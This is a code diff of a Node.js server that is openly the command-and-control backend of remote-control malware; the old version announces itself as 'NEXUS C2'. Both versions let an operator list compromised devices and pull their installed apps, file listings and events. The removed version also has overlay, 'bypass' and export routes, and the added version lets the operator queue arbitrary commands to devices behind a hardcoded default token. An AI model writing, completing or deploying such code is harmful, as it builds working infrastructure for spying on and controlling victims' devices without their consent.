@@ -1,118 +1,75 @@
 'use strict';
-require('dotenv').config();
+const http    = require('http');
+const path    = require('path');
+const express = require('express');
+const hub     = require('../core/hub');
 
-const http        = require('http');
-const path        = require('path');
-const fs          = require('fs');
-const express     = require('express');
-const session     = require('express-session');
-const PgSession   = require('connect-pg-simple')(session);
-const { pool }    = require('../core/db');  // pg Pool reused for sessions
-const WebSocket   = require('ws');
-const compression = require('compression');
+const PORT    = process.env.PORT  || 3000;
+const TOKEN   = process.env.TOKEN || 'alpha2024';
 
-const { handleDevice, handleOperator } = require('../core/hub');
-const { requireLogin, requireLoginWs } = require('../middleware/auth');
-const apiRouter     = require('../routes/api');
-const authRouter    = require('../routes/auth');
-const overlayRouter = require('../routes/overlays');
-const exportRouter  = require('../routes/export');
-const bypassRouter  = require('../routes/bypass');
+const app = express();
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static(path.join(__dirname, '..', 'public')));
 
-const PORT   = parseInt(process.env.PORT || '3000', 10);
-const DB_DIR = path.resolve(
-  process.env.DB_PATH ? path.dirname(process.env.DB_PATH) : path.join(__dirname, '../data')
-);
-fs.mkdirSync(DB_DIR, { recursive: true });
+// ── Auth middleware ────────────────────────────────────────────────────────────
+app.use('/api', (req, res, next) => {
+  const tok = req.headers['x-alpha-token'] || req.query.token;
+  if (tok !== TOKEN) return res.status(401).json({ error: 'unauthorized' });
+  next();
+});
 
-// ── Express ────────────────────────────────────────────────────────────────────
-const app    = express();
+// ── REST API ──────────────────────────────────────────────────────────────────
+const db = require('../core/db');
+
+app.get('/api/devices', (_req, res) => {
+  const rows   = db.all(`SELECT * FROM devices ORDER BY last_seen DESC`);
+  const online = [...hub.devices.keys()];
+  res.json({ devices: rows, online });
+});
+
+app.get('/api/apps/:devId', (req, res) => {
+  const row = db.get(`SELECT data FROM app_listings WHERE dev_id=? ORDER BY ts DESC LIMIT 1`,
+                     [req.params.devId]);
+  res.json(row ? JSON.parse(row.data) : { apps: [] });
+});
+
+app.get('/api/files/:devId', (req, res) => {
+  const rows = db.all(`SELECT path,data,ts FROM file_listings WHERE dev_id=? ORDER BY ts DESC LIMIT 10`,
+                      [req.params.devId]);
+  res.json(rows);
+});
+
+app.get('/api/events/:devId', (req, res) => {
+  const rows = db.all(`SELECT type,data,ts FROM events WHERE dev_id=? ORDER BY ts DESC LIMIT 100`,
+                      [req.params.devId]);
+  res.json(rows);
+});
+
+// Send command via REST (for scripting)
+app.post('/api/cmd', (req, res) => {
+  const { devId, cmd, args } = req.body;
+  if (!devId || !cmd) return res.status(400).json({ error: 'devId and cmd required' });
+  const dev = hub.devices.get(devId);
+  if (dev) {
+    const payload = { action: cmd, type: cmd, ...args };
+    dev.ws.send(JSON.stringify(payload));
+    res.json({ sent: true });
+  } else {
+    db.enqueueCmd(devId, cmd, args || {});
+    res.json({ queued: true });
+  }
+});
+
+// Token check endpoint (for dashboard login)
+app.post('/api/login', (req, res) => {
+  const { token } = req.body;
+  res.json({ ok: token === TOKEN });
+});
+
+// ── HTTP + WebSocket server ────────────────────────────────────────────────────
 const server = http.createServer(app);
+hub.init(server);
 
-const sessionMw = session({
-  store: new PgSession({
-    pool,                          // reuse existing pg pool
-    tableName: 'user_sessions',    // auto-created by connect-pg-simple
-    createTableIfMissing: true,
-    pruneSessionInterval: 60 * 15, // purge expired sessions every 15 min
-  }),
-  secret:            process.env.SESSION_SECRET || 'ly-v2-dev-secret-replace-me',
-  resave:            false,
-  saveUninitialized: false,
-  name:              'ly.sid',
-  cookie: {
-    secure:   process.env.NODE_ENV === 'production',
-    httpOnly: true,
-    sameSite: 'strict',
-    maxAge:   12 * 60 * 60 * 1000,
-  }
+server.listen(PORT, () => {
+  console.log(`[Alpha] server running on :${PORT}  token=${TOKEN}`);
 });
-
-app.set('trust proxy', 1);
-app.use(compression({ threshold: 512 }));
-app.use(express.json({ limit: '64mb' }));
-app.use(express.urlencoded({ extended: true, limit: '64mb' }));
-app.use(sessionMw);
-
-// ── Static files ───────────────────────────────────────────────────────────────
-app.use('/static', express.static(path.join(__dirname, '../public'), {
-  maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0,
-  etag:   true,
-}));
-
-// ── Routes ─────────────────────────────────────────────────────────────────────
-app.use('/', authRouter);
-app.use('/api',          requireLogin, apiRouter);
-app.use('/api/overlays', requireLogin, overlayRouter);
-app.use('/api/bypass',   bypassRouter);
-app.use('/api/export',   requireLogin, exportRouter);
-
-app.get('/', requireLogin, (_, res) =>
-  res.sendFile('index.html', { root: path.join(__dirname, '../public') })
-);
-
-app.get('/health', (_, res) => res.json({ ok: true, ts: Date.now() }));
-app.use((_, res) => res.redirect('/'));
-
-// ── WebSocket ──────────────────────────────────────────────────────────────────
-const wss = new WebSocket.Server({
-  noServer:          true,
-  perMessageDeflate: false,   // JPEG already compressed
-  maxPayload:        16_777_216, // 16 MB
-  clientTracking:    false,
-});
-
-server.on('upgrade', (req, socket, head) => {
-  const url = req.url.split('?')[0];
-
-  if (url === '/ws/operator') {
-    sessionMw(req, {}, () => {
-      if (!requireLoginWs(req)) {
-        socket.write('HTTP/1.1 401 Unauthorized\r\nConnection: close\r\n\r\n');
-        socket.destroy();
-        return;
-      }
-      wss.handleUpgrade(req, socket, head, ws => handleOperator(ws, req));
-    });
-    return;
-  }
-
-  // Device connection — accepts /ws/device, /, or any path with x-device-id header
-  if (url === '/ws/device' || url === '/' || req.headers['x-device-id']) {
-    wss.handleUpgrade(req, socket, head, ws => handleDevice(ws, req));
-    return;
-  }
-
-  socket.destroy();
-});
-
-// ── Boot ───────────────────────────────────────────────────────────────────────
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n  NEXUS C2  →  http://0.0.0.0:${PORT}`);
-  console.log(`  Device WS →  ws://0.0.0.0:${PORT}/ws/device`);
-  console.log(`  Op WS     →  ws://0.0.0.0:${PORT}/ws/operator\n`);
-});
-
-process.on('uncaughtException',  e => console.error('[!] uncaught:', e.message));
-process.on('unhandledRejection', e => console.error('[!] rejection:', e));
-  
